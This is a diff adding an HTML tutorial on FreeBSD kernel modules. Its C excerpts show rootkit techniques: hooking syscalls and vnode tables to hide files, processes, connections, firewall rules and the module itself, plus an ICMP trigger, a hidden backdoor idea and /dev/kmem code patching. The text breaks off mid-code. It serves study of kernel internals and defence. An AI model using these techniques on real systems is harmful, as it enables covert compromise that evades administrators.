@@ -1,0 +1,1384 @@
+<html>
+<head>
+<title>Fun and Games with FreeBSD Kernel Modules</title>
+</head>
+
+<body bgcolor="#ffffff">
+<h2>Fun and Games with FreeBSD Kernel Modules</h2>
+v0.1b by Stephanie Wehner, 04/08/2001<br>
+<br>
+<p>
+<a href="#Intro">1. Introduction</a><br>
+<a href="#Intro-Kernel">1.1 Kernel Modules</a><br>
+<a href="#Intro-Useful">1.2 Useful Functions</a><br>
+<p>
+<a href="#Methods">2. Techniques</a><br>
+<a href="#Methods-Function">2.1 Replacing Function Pointers</a><br>
+<a href="#Methods-Function-Sys">2.1.1. System Calls</a><br>
+<a href="#Methods-Function-Other">2.1.2. Other Tables</a><br>
+<a href="#Methods-Function-Single">2.1.3. Single Function Pointers</a><br>
+<a href="#Methods-Lists">2.2. Modifying Kernel Lists</a><br>
+<a href="#Methods-Kernel">2.3. Reading and Writing Kernel Memory</a><br>
+<a href="#Methods-Kernel-Find">2.3.1. Finding the address of a symbol</a><br>
+<a href="#Methods-Kernel-Read">2.3.2. Reading data</a><br>
+<a href="#Methods-Kernel-Modify">2.3.3. Modifying kernel code</a><br>
+
+<p>
+<a href="#Common">3. Common Applications</a><br>
+<a href="#Common-Files">3.1. Hiding & Redirecting Files</a><br>
+<a href="#Common-Process">3.2. Hiding Processes</a><br>
+<a href="#Common-Network">3.3. Hiding Network Connections</a><br>
+<a href="#Common-Firewall">3.4. Hiding Firewall Rules</a><br>
+<a href="#Common-Trigger">3.5. Network Triggers</a><br>
+<a href="#Common-Module">3.6. Hiding the module</a><br>
+<a href="#Common-Other">3.7. Other applications</a><br>
+<p>
+<a href="#Patching">4. Patching the kernel</a><br> 
+<a href="#Patching-Example">4.1. Introduction</a><br>
+<a href="#Patching-Jumps">4.2. Inserting Jumps</a><br>
+<a href="#Patching-Replace">4.3. Replacing Kernel Code</a><br>
+<p>
+<a href="#Reboot">5. Reboot Proofing</a><br>
+<p>
+<a href="#Experimental">6. Experimental</a><br>
+<p>
+<a href="#Defense">7. Defending yourself: The cat and mouse game</a><br>
+<a href="#Defense-Symbol">7.1. Checking the symbol table</a><br>
+<a href="#Defense-Trap">7.2. Building a Trap Module</a><br>
+<a href="#Defense-Direct">7.3. Retrieving data directly</a><br>
+<a href="#Defense-Remarks">7.4. Remarks</a><br>
+<p>
+<a href="#Conclusion">8. Conclusion</a><br>
+<p>
+<a href="#Code">9. Code</a><br>
+<p>
+<a href="#References">10. References</a><br>
+<p>
+<a href="#Thanks">11. Thanks</a><br>
+
+
+<h3><a name="Intro"></a>1. Introduction</h3>
+
+Kernel modules for FreeBSD have been around for quite some time, yet many people still consider them to be
+rather obscure. This article will explore some ways to use kernel modules and kernel memory in order 
+to alter the behaviour of the system. 
+<p>
+All the information you have about your system comes from the kernel. No matter if you want
+to know the currently running processes, the files on your system or the current network 
+connections, your tools will request this information from the kernel. If one can alter
+the behaviour of the kernel and the kernel data one can effectively change the perception
+you have of your system. This article looks at some of the more 'standard' applications
+of this technique, such as hiding processes and files and will then go into other ways
+of altering your kernel, such as patching kernel code or altering the symbol table.
+Almost all these techniques could be used by someone attacking a system as well as by 
+someone from the defensive side. 
+<p>
+Unlike other operating systems, BSD has a feature called secure levels. This allows you to 
+put the system in a state where it is no longer possible to load kernel modules for example. 
+Even though there've been several kernel exploits in the past that lowered the secure level of a
+running machine and it would be possible to load the module if a reboot is forced, many sysadmins 
+still feel confident that no one will employ these techniques and often put these methods off as being too far fetched. Hopefully it will become clear that these methods are not at all obscure and within reach of most people with a good knowledge
+of C and some time.
+<p>
+This text has been written for educational purposes only. Use with care :)
+All the example code is available as a single package called Curious Yellow (CY) at the
+end of this article.
+
+<h4><a name="Intro-Kernel"></a>1.1 Kernel Modules</h4>
+In short, kernel modules allow you to load new code into the kernel. Many of the examples
+below use them to add new functions. 
+<p>
+This text assumes you know the basics of how to write a FreeBSD kernel module. If you've never
+worked with them before you might want to consult the <a href="http://www.daemonnews.org/200010/blueprints.html">
+Dynamic Kernel Linker (KLD) Facility Programming Tutorial</a> published in daemonnews or take a look
+at the examples provided in /usr/share/examples/kld/ on your FreeBSD machine.
+
+<h4><a name="Intro-Useful"></a>1.2 Useful Functions</h4>
+
+If you've never done any kernel programming before, here are some functions that can come in very handy
+and that are especially useful when dealing with system calls.
+
+<p>
+<h5>copyin/copyout/copyinstr/copyoutstr</h5>
+<p>
+These functions allow you to copy contiguous chunks of data from user space to kernel space and vice
+versa. More detailed information can be found in their manpage (copy(9)) and also in the KLD tutorial
+mentioned above. 
+<p>
+Say you made a system call which also takes a pointer to a character string as an argument. You now
+want to copy the user supplied data to kernel space:
+
+<pre>
+
+struct example_call_args {
+    char *buffer;
+};
+
+int
+example_call(struct proc *p, struct example_call_args *uap)
+{
+    int error;
+    char kernel_buffer_copy[BUFSIZE];
+
+    /* copy in the user data */
+    error = copyin(uap->buffer, &kernel_buffer_copy, BUFSIZE);
+
+    [...]
+
+}
+</pre>
+
+<h5>fetch/store</h5>
+If you just want to transfer small amounts of data, you might want to use the functions
+described in fetch(9) and store(9). These functions allow you to transfer byte and word
+sized pieces of memory.
+
+<h5>spl..</h5>
+The functions described in spl(9) allow you to manipulate interrupt priorities. This
+allows you to prevent certain interrupt handlers from being run. In some later examples 
+the pointer to a function such as icmp_input for example is altered. If this takes multiple 
+steps you might want to block an interrupt while you're making changes.
+
+<h5>vm_map_find</h5>
+   
+<h3><a name="Methods"></a>2. Techniques</h3>
+
+This section lists some common methods that are later used to implement some of the 
+tricks like process hiding, connection hiding and more. Of course you could use
+the same methods to do other things as well.
+
+<h4><a name="Methods-Function"></a>2.1. Replacing Function Pointers</h4>
+
+Probably the most commonly used technique is to replace function pointers
+in the kernel to point to the newly loaded functions. In order to make use
+of this method, a kernel module is loaded that carries your new function.
+You can then swap your function for the original one when the module is loaded.
+Alternatively you can later do the swap by writing to /dev/kmem (see below)
+<p>
+Since you're replacing an existing function, it is important that your newly
+created function will take the same arguments as the original one. :) You can 
+then either do some pre or post processing while still calling the original 
+function or you can write a complete replacement.
+<p>
+There are a lot of hooks in the kernel where you can employ this method. Let's
+just look at some of the commonly used places. 
+
+<h5><a name="Methods-Function-Sys"></a>2.1.1. System Calls</h5>
+
+The classic case is to replace system calls. FreeBSD keeps a list of syscalls
+in a struct called sysent. Take a look at /sys/kern/init_sysent.c, here's
+a very short excerpt:
+
+<pre>
+struct sysent sysent[] = {
+        { 0, (sy_call_t *)nosys },                      /* 0 = syscall */
+        { AS(rexit_args), (sy_call_t *)exit },          /* 1 = exit */
+        { 0, (sy_call_t *)fork },                       /* 2 = fork */
+        { AS(read_args), (sy_call_t *)read },           /* 3 = read */
+        { AS(write_args), (sy_call_t *)write },         /* 4 = write */
+        { AS(open_args), (sy_call_t *)open },           /* 5 = open */
+        { AS(close_args), (sy_call_t *)close },         /* 6 = close */
+        [...]
+</pre>
+
+If you want to know what struct sysent looks like and what the numbers of the
+system calls are, check out /sys/sys/sysent.h and /sys/sys/syscall.h respectively.
+<p>
+Say you would want to replace the open syscall. In the MOD_LOAD section of your
+load module function, you would then do something like:
+
+<pre>
+sysent[SYS_open] = (sy_call_t *)your_new_open;
+</pre>
+
+If you would want to restore the original call when the module is unloaded, you can
+just set it back:
+
+<pre>
+sysent[SYS_open].sy_call = (sy_call_t *)open;
+</pre>
+
+A complete example will follow below.
+
+<h5><a name="Methods-Function-Other"></a>2.1.2. Other Tables</h4>
+
+The system call table is not the only place however you can mess with. There's a lot of
+other interesting places in the FreeBSD kernel. Most notably are inetsw and the vnode tables
+of the different filesystems. 
+<p>
+struct ipprotosw intesw[] keeps a list of information about every supported inet protocol. 
+For every protocol it determines for example which function will be called when a packet
+comes in and when it goes out. /sys/netinet/in_proto.c will provide you with more information.
+This means that this provides us with another place to hook up our own function. :)
+
+If you would want to set your own function when the module is loaded you would do something like:
+<pre>
+inetsw[ip_protox[IPPROTO_ICMP]].pr_input = new_icmp_input;
+</pre>
+
+Again, a complete example will follow later.
+<p>
+For every filesystem a vnode table is kept that specifies what function is called for which VOP.
+Say you wanted to replace ufs_lookup:
+<pre>
+ufs_vnodeop_p[VOFFSET(vop_lookup)] = (vop_t *) new_ufs_lookup;
+</pre>
+<p>
+There's more places like this where you can hook in, depending on what you want to achieve.
+The only documentation however is the kernel source itself. 
+
+<h4><a name="Methods-Function-Single"></a>2.1.3. Single Function Pointers</h4>
+Occasionally there are also single pointers that are used to determine which function to call.
+This is for example the case with ip_fw_ctl_ptr, which points to the function ipfw control
+requests will go to. Again, this gives you another place to hook in.
+
+<h4><a name="Methods-Modify"></a>2.2. Modifying Kernel Lists</h4>
+
+Just replacing functions is by itself not a lot of fun. You might also want to alter
+the data as it is known by the kernel. A lot of interesting things are stored as lists
+inside the kernel. If you've never worked with the list macros as defined in /sys/sys/queue.h
+before, you might want to familiarize yourself with them before continuing in this direction.
+It will make it easier to understand the existing definitions you will encounter in kernel
+code and it will also prevent you from making mistakes if you use these macros yourself.
+<p>
+Some of the more interesting lists are:
+<p>
+The process list: struc proclist allproc and zombproc. You probably don't want to alter these
+lists as they are also used for scheduling purposes unless you want to rewrite larger parts
+of the kernel. However you can filter these lists when a user requests them.
+<p>
+The linker_files list: this list contains the files linked to the kernel. Every link file
+can contain one or more modules. This has been described in the <a href="http://packetstormsecurity.org/papers/unix/bsdkern.htm">THC article</a>, so I won't go into that here. This list will become important
+when we want to alter the address of a symbol or hide the loaded file with modules.
+<p>
+The module list: modulelist_t modules contains a list of the loaded modules. Note that this is
+different from the files linked. A file can contain more then one module. This will also become
+important when you want to hide your module.
+<p>
+Of course there's a lot more to be found in the kernel sources.
+
+<h4><a name="Methods-Kernel"></a>2.3. Reading and Writing Kernel Memory</h4>
+
+Modules are not the only way to get to things inside the kernel. You can also modify kernel memory
+directly via /dev/kmem. 
+
+<h5><a name="Methods-Kernel-Find"></a>2.3.1. Finding the address of a symbol</h5>
+When you deal with kernel memory you might first be interested in finding the correct
+place of a symbol you might want to read or write to. In FreeBSD the kvm(3) functions
+provide you with some useful tools to do this. Please consult the manpage on how to use
+them. Below is a small example that will find the address given a symbol name. You can
+also find this example in the CY package in tools/findsym.c.
+
+<pre>
+    [...]
+    char errbuf[_POSIX2_LINE_MAX];
+    kvm_t *kd;
+    struct nlist nl[] = { { NULL }, { NULL }, };
+
+    nl[0].n_name = argv[1];
+
+    kd = kvm_openfiles(NULL,NULL,NULL,O_RDONLY,errbuf);
+    if(!kd) {
+        fprintf(stderr,"ERROR: %s\n",errbuf);
+        exit(-1);
+    }
+
+    if(kvm_nlist(kd,nl) < 0) {
+        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
+        exit(-1);
+    }
+
+    if(nl[0].n_value) 
+        printf("symbol %s is 0x%x at 0x%x\n",nl[0].n_name,nl[0].n_type,nl[0].n_value);     
+    else 
+        printf("%s not found\n",nl[0].n_name);
+
+    if(kvm_close(kd) < 0) {
+        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
+        exit(-1);
+    }
+    [...]
+</pre>
+
+<h5><a name="Methods-Kernel-Read"></a>2.3.2. Reading data</h5>
+Now that you have found the correct address, you might want to read data from it. You can do
+so with kvm_read. The files tools/kvmread.c and tools/listprocs.c will provide you with an
+example. 
+<p>
+If you want to retrieve a whole list from the kernel, you can do so by first finding the list
+head and then using the pointer to the next element to go on. This pointer will provide you with
+the correct address to read from. Likewise you can also retrieve other data in the struct that
+has a pointer to it, like the user credentials below. This is an excerpt from listproc.c
+that illustrates how this works after the address of allprocs, the list head, has been determined:
+
+<pre>
+    [...]
+
+    kvm_read(kd,nl[0].n_value, &allproc, sizeof(struct proclist));
+
+    printf("PID\tUID\n\n");
+
+    for(p_ptr = allproc.lh_first; p_ptr; p_ptr = p.p_list.le_next) {
+
+        /* read this proc structure */
+        kvm_read(kd,(u_int32_t)p_ptr, &p, sizeof(struct proc));
+
+        /* read the user credential */
+        kvm_read(kd,(u_int32_t)p.p_cred, &cred, sizeof(struct pcred));
+
+        printf("%d\t%d\n", p.p_pid, cred.p_ruid);
+
+    }
+</pre>
+
+<h5><a name="Methods-Kernel-Modify"></a>2.3.3. Modifying kernel code</h5>
+In a similar fashion you can also write to kernel memory. The manpage on kvm_write will give
+you more information. This basically works almost like reading. Later on in this text some
+examples will be given. If you're impatient, you can also take a look at tools/putjump.c now.
+
+<h3><a name="Common"></a>3. Common Applications</h3>
+
+<h4><a name="Common-Files"></a>3.1. Hiding & Redirecting Files</h4>
+
+One of the most common things to do is to hide files. This is one of the easier things to do,
+so let's start with this. 
+<p>
+There's multiple levels you can hook in your code in order to hide your files. One way is
+via catching system calls such as open, stat, etc. Another way is to hook in at the lookup
+functions of the underlying filesystem.
+
+<h5>3.1.1. Via System Calls</h5>
+This is the way it is usually done, and has been used by various tools and is also described
+in the <a href="http://packetstormsecurity.org/papers/unix/bsdkern.htm">THC article</a>. 
+For the calls that are directed at one specific file, such as open, stat,
+chmod etc, this is very simple to do. You can add a new function, say new_open. In this
+function you check the supplied filename. If this filename has certain characteristics,
+eg it starts with a certain string, it will be hidden right away by returning a not found
+error. Otherwise the original open function will be called. Example from module/file-sysc.c:
+
+<pre>
+    /* 
+     *    open replacement 
+     */
+
+    int
+    new_open(struct proc *p, register struct open_args *uap)
+    {
+        char name[NAME_MAX];
+        size_t size;
+
+        /* get the supplied arguments from userspace */     
+        if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
+            return(EFAULT);
+
+        /* if the entry should be hidden and the user is not magic, return not found */
+        if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
+            return(ENOENT);
+        
+        return(open(p,uap));
+    }
+</pre>
+
+In the function file_hidden you can then check if the filename should be hidden. In the loader
+of your module you then replace the call to open with new_open in the syscall table:
+
+<pre>
+    static int
+    load(struct module *module, int cmd, void *arg)
+    {
+        switch(cmd) {
+            case MOD_LOAD:
+                mod_debug("Replacing open call\n");
+                sysent[SYS_open]=new_open_sysent;
+                break;
+
+            case MOD_UNLOAD:
+                mod_debug("Restoring open\n");
+                sysent[SYS_open].sy_call = (sy_call_t *)open;
+                break;
+
+            default:
+                error = EINVAL;
+                break;
+        }
+        return(error);
+    }
+</pre>
+
+The other calls can be changed the same way. Only for getdirentries, which retrieves a 
+directory listing, you have to do a bit more effort. In this case you can call the original
+getdirentries and then cut the files you want to hide out of the response. This has been described
+in the <a href="http://packetstormsecurity.org/papers/unix/bsdkern.htm">THC article</a> and some other places, so I won't go into detail here.
+
+<h5>3.1.2. Via the vnode tables</h5>
+
+The other way of hiding files is via the functions of the underlying filesystem. This approach
+has the advantage that you don't need to alter the syscall table and you can save yourself 
+some work as the lookup function will in the end be called from a lot of syscalls you would all
+have to replace otherwise. Also, you might want to consider using some other atrribute of
+the file then it's name to determine whether it should be hidden.
+<p>
+For every filesystem there is such a VOP table that determines which function to call for 
+which kind of operation. For UFS you can find this in /sys/ufs/ufs/ufs_vnops.c, for Procfs
+this is located in /sys/miscfs/procfs/procfs_vnops.c. For other filesystems this will be
+located in similar files. If you want to hide a single file, you have to change the lookup
+and in some cases also the cached lookup function. 
+<p>
+Say you wanted all lookups on a UFS filesystem to go to your own function. First of 
+all you would make a new ufs_lookup. From module/file-ufs.c:
+
+<pre>
+    /*
+     *    ufs lookup replacement
+     */
+
+    int
+    new_ufs_lookup(struct vop_cachedlookup_args *ap)
+    {
+
+        struct componentname *cnp = ap->a_cnp;
+
+        if(file_hidden(cnp->cn_nameptr) && 
+            !(is_magic_user((cnp->cn_cred)->cr_uid))) {
+            mod_debug("Hiding file %s\n",cnp->cn_nameptr);
+            return(ENOENT);
+        }
+
+        return(old_ufs_lookup(ap));
+    }
+</pre>
+
+Then you would have to adjust the pointer in the vnode table when the module is loaded:
+
+<pre>
+    extern vop_t **ufs_vnodeop_p;
+    vop_t *old_ufs_lookup;
+
+    static int
+    load(struct module *module, int cmd, void *arg)
+    {
+        switch(cmd) {
+            case MOD_LOAD:
+                mod_debug("Replacing UFS lookup\n");
+                old_ufs_lookup = ufs_vnodeop_p[VOFFSET(vop_lookup)];
+                ufs_vnodeop_p[VOFFSET(vop_lookup)] = (vop_t *) new_ufs_lookup;
+                break;
+
+            case MOD_UNLOAD:
+                mod_debug("Restoring UFS lookup\n");
+                ufs_vnodeop_p[VOFFSET(vop_lookup)] = old_ufs_lookup;
+                break;
+
+            default:
+                error = EINVAL;
+                break;
+        }
+        return(error);
+    }
+</pre>
+
+This is not much more effort then replacing the syscalls. Similarly you have to adjust ufs_readdir
+if you would want to hide a file from directory listings. Currently CY does not come with 
+an example for that but you can basically do it like the getdirentries and the procfs_readdir
+replacements. 
+
+<h5>3.1.3. General Remarks</h5>
+File redirection can be implemented in exactly the same way, just replace the file that's
+requested with the one you want to give instead. If you want to do execution redirection
+you have to change execve. This is quite easy to do. You have to catch execve and alter the
+filename to execute that the user passed to it. Note that you might need to allocate more memory
+in user space. This can be done with vm_map_find. CY contains an example on how to execute another
+program from the kernel where this is used. You could easily adapt this to replace execve.
+
+<h4><a name="Common-Processes"></a>3.2. Hiding Processes</h4>
+
+<h5>3.2.1. Hiding</h5>
+Another common thing to do is to hide processes. In order to achieve this you need to 
+intercept the various ways information about processes is obtained. Also you want to keep 
+track of which processes you want to hide. Every process is recorded in a struct proc. Check
+out /sys/sys/proc.h for the complete structure. On of the fields is called p_flag, which allows
+certain flags to be set for each process. One can therefore introduce a new flag: 
+<pre>
+#define P_HIDDEN 0x8000000
+</pre>
+
+When a process is hidden, we'll set this flag so it can be recognized later. See module/control.c
+for the CY control functions that hide and unhide a process.
+<p>
+If you do a ps, it will go to kvm_getprocs, which in return will make a sysctl with the following arguments:
+
+<pre>
+name[0] = CTL_KERN
+name[1] = KERN_PROC
+name[2] = KERN_PROC_PID, KERN_PROC_ARGS etc
+name[3] can contain the pid in case information about only one process is requested.
+</pre>
+
+name is an array that contains the mib, describing what kind of information is requested:
+eg what kind of sysctl operation it is and what is requested exactly. 
+In short the following sub query types are possible: (from /sys/sys/sysctl.h)
+
+<pre>
+/*
+ * KERN_PROC subtypes
+ */
+#define KERN_PROC_ALL           0       /* everything */
+#define KERN_PROC_PID           1       /* by process id */
+#define KERN_PROC_PGRP          2       /* by process group id */
+#define KERN_PROC_SESSION       3       /* by session of pid */
+#define KERN_PROC_TTY           4       /* by controlling tty */
+#define KERN_PROC_UID           5       /* by effective uid */
+#define KERN_PROC_RUID          6       /* by real uid */
+#define KERN_PROC_ARGS          7       /* get/set arguments/proctitle */
+</pre>
+
+This will ultimately end up at __sysctl. The THC article also contains some information on this, but 
+since I had implemented it differently, I included some example code in module/process.c. This is 
+also the place where we'll hide network connections later.
+<p>
+The other way process information is obtained via procfs. Tools like top use procfs, but you can also
+take a quick look yourself. For every process /proc will contain a directory with the specified process
+id and contain files that contain more information about this process. Remember that all the filesystem
+information was also just what the kernel gives you, it doesn't matter where this data comes from, so 
+the filesystem way is just one way of representing process information. Hiding files from procfs therefore
+comes down to what we've used before in the file section. You could of course hide a pid from getdirentries
+etc, but I think that's a bit overdone and to my experience, especially on servers, files with numeric names 
+actually tend to get created. This would cause things to break and suspicion to arise :) 
+<p>
+However, similar to UFS one can also just fix the corresponding entries for procfs. Example code for this
+is given in module/process.c. A new procfs lookup for example could look like this:
+
+<pre>
+    /*
+     * replacement for procfs_lookup, this will be used in the case someone doesn't just
+     * do a ls in /proc but tries to enter a dir with a certain pid
+     */
+
+    int
+    new_procfs_lookup(struct vop_lookup_args *ap)
+    {
+        struct componentname *cnp = ap->a_cnp;
+        char *pname = cnp->cn_nameptr;
+        pid_t pid;
+
+        pid = atopid(pname, cnp->cn_namelen);
+
+        if(pid_hidden(pid) && !(is_magic_user((cnp->cn_cred)->cr_uid))) 
+            return(ENOENT);
+
+        return(old_procfs_lookup(ap));
+    }
+</pre>
+
+You would then replace it when you load the module:
+
+<pre>
+    extern struct vnodeopv_entry_desc procfs_vnodeop_entries[];
+    extern struct vnodeopv_desc **vnodeopv_descs;
+    vop_t *old_procfs_lookup;
+
+    static int
+    load(struct module *module, int cmd, void *arg)
+    {
+        switch(cmd) {
+            case MOD_LOAD:
+                mod_debug("Replacing procfs_lookup\n");
+                old_procfs_lookup = procfs_vnodeop_p[VOFFSET(vop_lookup)];
+                procfs_vnodeop_p[VOFFSET(vop_lookup)] = (vop_t *)new_procfs_lookup;
+                break;
+
+            case MOD_UNLOAD:
+                mod_debug("Restoring procfs_lookup\n");
+                procfs_vnodeop_p[VOFFSET(vop_lookup)] = old_procfs_lookup;
+                break;
+
+            default:
+                error = EINVAL;
+                break;
+    }
+    return(error);
+}
+</pre>
+
+<h5>3.2.2. Hiding children and catching signals</h5>
+
+You would probably want to make sure that descendants of a hidden process will also stay hidden.
+Likewise you would want to prevent your hidden processes from being killed. For this you can 
+intercept the calls to fork and kill. These are system calls and can be replaced using the methods
+described above, so I won't provide any code here. You can find examples in module/process.c.
+
+<h3><a name="Network"></a>3.3. Hiding Network Connections</h3>
+
+Hiding network connections from queries such as netstat -an, is very similar to hiding processes.
+If this information is retrieved, it will also execute a sysctl, yet alone the mib will be 
+different. In case of TCP connections:
+
+<pre>
+name[0] = CTL_NET
+name[1] = PF_INET
+name[2] = IPPROTO_TCP
+name[3] = TCPCTL_PCBLIST
+</pre>
+
+In exactly the same way as before, the data to be hidden will be cut out of the data retrieved
+by userland_sysctl. CY allows you to specify various connections that should be hidden via cyctl.
+See module/process.c for the __sysctl modifications. 
+
+<h3><a name="Common-Firewall"></a>3.4. Hiding Firewall Rules</h3>
+
+Another fun thing to do is to hide firewall rules. This can be done quite easily by substituting
+your own function for ip_fw_ctl. ip_fw_ctl is the ipfw control function that all requests like
+adding, deleting, listing etc firewall rules will be passed to. We can therefore intercept these
+requests in our own function and act accordingly.
+<p>
+The CY control function provides an option to hide the specified firewall rule. Similar to processes
+one can use a flag to indicate hidden rules. When one walks the list of firewall rules, each rule
+wil be of struct ip_fw. You can find the layout of this struct in /sys/netinet/ip_fw.h. It contains
+an entry called fw_flg, which records the flags set for this rule. You add a new flag, namely
+IP_FW_F_HIDDEN. 
+
+<pre>
+#define IP_FW_F_HIDDEN 0x80000000
+</pre>
+
+<p>
+The example code provided in module/fw.c hides firewall rules from list requests: ipfw -l. When
+you do a ipfw -l this function will be called and the operation will be IP_FW_GET. So we can
+just deal with this request our own and pass all other requests on to the original function. 
+For each rule we encounter while walking through the lists of rules, we check if the hidden
+flag is set. If so, it will not be included in the output. Since this is rather long I won't include 
+it here in the text, but you can find the example code including the modification upon loading of the 
+module in CY.
+<p>
+Since FreeBSD ipfw comes with functionality to forward and divert connections you could probably
+also build backdoors this way. If this is enabled, you can run your own back door on localhost
+and a certain port, say 12345. You can then first hide this entry from netstat with the 
+help of cyctl using the method described earlier. You can then add a firewall rule that
+will forward all connections to, say, port 22 coming from a certain host to port 12345, localhost.
+Then you can hide your firewall rules for this. I still have to try this in practice, but this
+will be in the updated version I plan to release when I have more time after HAL.
+
+<h3><a name="Common-Trigger"></a>3.5. Network Triggers</h3>
+
+As described above there is more places in the kernel where you can swap the pointer
+to an existing function for your own. One of these places is inetsw, which contains a
+list of inet protocols and information about them, eg like the functions to call when a packet
+of this protocol type comes in or goes out. 
+<p>
+CY contains a small example, which allows you to define a trigger on an icmp echo packet
+containing a certain payload. First of all you have to create a replacement for icmp_input
+again. This has been done in module/icmp.c, but will only be included here partially since it is rather 
+long. One thing you can do when you want to alter just a little piece in these functions,
+is to copy the original function and then just modify the few locations you intent to change.
+The icmp header itself is described in /usr/include/netinet/ip_icmp.h.
+<p>
+Part of module/icmp.c:
+
+<pre>
+    [...]
+
+    case ICMP_ECHO:
+        if (!icmpbmcastecho
+            && (m->m_flags & (M_MCAST | M_BCAST)) != 0) {
+            icmpstat.icps_bmcastecho++;
+            break;
+        }
+
+    /* check if the packet contains the specified trigger */
+
+    if(!strcmp(icp->icmp_data,ICMP_TRIGGER)) {
+
+        mod_debug("ICMP trigger\n");
+
+        /* decrease receive stats */
+        icmpstat.icps_inhist[icp->icmp_type]--;
+
+        trigger_test(icp->icmp_data);
+
+        /* don't send a reply */
+        goto freeit;
+    }
+
+    [...]
+</pre>
+
+Then, in order to replace icmp_input when the module is loaded:
+
+<pre>
+    extern struct ipprotosw inetsw[];
+    extern u_char ip_protox[];
+    void *old_icmp_input;
+
+    static int
+    load(struct module *module, int cmd, void *arg)
+    {
+        switch(cmd) {
+            case MOD_LOAD:
+                mod_debug("Replacing ICMP Input\n");
+                old_icmp_input = inetsw[ip_protox[IPPROTO_ICMP]].pr_input;
+                inetsw[ip_protox[IPPROTO_ICMP]].pr_input = new_icmp_input;
+                break;
+
+            case MOD_UNLOAD:
+                mod_debug("Restoring icmp_input\n");
+                inetsw[ip_protox[IPPROTO_ICMP]].pr_input = old_icmp_input;
+                break;
+
+            default:
+                error = EINVAL;
+                break;
+        }
+        return(error);
+    }
+</pre>
+
+The CY example will just call a function with the icmp payload passed to it, 
+which is rather useless :) Other things would be possible of course. You could
+for example also use this to transform packets for the travel to the box
+and turn them back before inserting them into the normal packet processing engine.
+
+<h3><a name="Common-Module"></a>3.6. Hiding the Module</h3>
+
+Hiding all these things would still be rather obvious if the module itself would
+be visible. Therefore one would want to hide its existence as well. 
+<p>
+As mentioned earlier the kernel maintains a list of files linked. These files
+then contain the kernel code. So first of all, one would want to remove the file
+from this list. This list is called linker_files and can be found in /sys/kern/kern_linker.c.
+Furthermore it keeps a counter called next file id which is located in next_file_id,
+so one'd want to decrement that. The same goes for the reference counter of 
+the kernel.
+
+So, as the first step, the linked file will be removed from this list:
+
+<pre>
+            extern linker_file_list_t linker_files;
+            extern int next_file_id;
+            extern struct lock lock;
+
+            [...]
+            linker_file_t lf = 0;
+
+            /* lock exclusive, since we change things */
+            lockmgr(&lock, LK_EXCLUSIVE, 0, curproc);
+            (&linker_files)->tqh_first->refs--;
+
+            TAILQ_FOREACH(lf, &linker_files, link) {
+
+                if (!strcmp(lf->filename, "cyellow.ko")) {
+
+                   /*first let's decrement the global link file counter*/
+                   next_file_id--;
+
+                   /*now let's remove the entry*/
+                   TAILQ_REMOVE(&linker_files, lf, link);
+                   break;    
+                }
+            } 
+            lockmgr(&lock, LK_RELEASE, 0, curproc);
+</pre>
+
+The next thing one needs to do, is remove the modules from the module list. 
+In the case of CY this is only one. Similar to the linker_file the module
+list also keeps a counter, nextid, one should decrement.
+
+<pre>
+
+            extern modulelist_t modules;
+            extern int nextid;
+
+            [...]
+            module_t mod = 0;
+
+            TAILQ_FOREACH(mod, &modules, link) {
+
+                if(!strcmp(mod->name, "cy")) {
+                    /*first let's patch the internal ID counter*/
+                    nextid--;
+      
+                    TAILQ_REMOVE(&modules, mod, link);
+                }
+            }
+            [...]
+</pre>
+
+If you now look at kldstat the module will have disappeared. Note however
+because it was also deleted from the module list, modfind will no longer
+be able to locate your module. This is only a problem in case your module
+contains system calls you later want to use. However it is possible to specify
+the offset manually, if nothing else is loaded this will be 210. The CY
+control program cyctl allows you to specify this manually. This makes me assume
+there must be another way to still locate the module, but I haven't looked into that
+yet.
+
+<h3><a name="Common-Other"></a>3.6. Other Applications</h3>
+Of course there's lots of other things you can do with kernel modules. Some 
+example include tty hijacking, hiding the promiscuous mode of an interface
+and su'ing via a special system call that will set the process' user id to 0.
+The kernel patch described below is a bit similar to that, except that it
+changes suser so for many applications this becomes unnecessary. Hiding
+the promiscuous mode of an interface could also be done by clearing this
+flag for the interface in question by writing to /dev/kmem. However,
+in this case it will be cleared even if someone else is running tcpdump
+etc on the same interface. 
+<p>
+It should also be possible to filter reads and writes. This would
+become particularly interesting in the case of /dev/kmem through which
+a lot of information can be obtained.
+
+<h3><a name="Patching"></a>4. Patching the Kernel</h3>
+
+Kernel modules are not the only way to alter the workings of the kernel. You can also
+overwrite existing code and data via /dev/kmem. This opens various possibilities. 
+<p>
+In the techniques section I've already outlined some of the basic ways on how to work 
+with /dev/kmem. This section concentrates on writing to /dev/kmem.
+
+<h4><a name="Patching-Example"></a>4.1. Introduction</h4>
+A simple thing you can do in order to test writing is to insert a return at the beginning
+of an existing kernel function. One way to test this without disrupting any of your normal
+work is to load a kernel module, say CY not in stealth mode, and then write a return at
+the beginning of for example cy_ctl and use the cyctl to send command to CY. Nothing
+will happen, as cy_ctl will return right away. Check out tools/putreturn.c for the code
+on how to do this.
+
+<h4><a name="Patching-Jumps"></a>4.2. Inserting Jumps</h4>
+A very similar thing is to write a jump to a certain function. This for example allows
+you to redirect existing calls to your own without altering the syscall table or any 
+other tables involved. 
+<p>
+This means you would load a module with your own calls, but not adapt anything
+when the module is loaded. You can then write a jump to /dev/kmem to redirect
+the execution of the old function. Alternatively you could also do this when the
+module is loaded of course.
+<p>
+In the tools section, there's a file called tools/putjump.c:
+
+<pre>
+/* the jump */
+unsigned char code[] = "\xb8\x00\x00\x00\x00"  /* movl   $0,%eax  */
+                       "\xff\xe0"              /* jmp    *%eax    */
+;
+
+int
+main(int argc, char **argv) {
+
+    char errbuf[_POSIX2_LINE_MAX];
+    long diff; 
+    kvm_t *kd;
+    struct nlist nl[] = { { NULL }, { NULL }, { NULL }, };
+
+    if(argc < 3) {
+        fprintf(stderr,"Usage: putjump [from function] [to function]\n");
+        exit(-1);
+    }
+
+    nl[0].n_name = argv[1];
+    nl[1].n_name = argv[2];
+
+    kd = kvm_openfiles(NULL,NULL,NULL,O_RDWR,errbuf);
+    if(kd == NULL) {
+        fprintf(stderr,"ERROR: %s\n",errbuf);
+        exit(-1);
+    }
+
+    if(kvm_nlist(kd,nl) < 0) {
+        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
+        exit(-1);
+    }
+
+    if(!nl[0].n_value) {
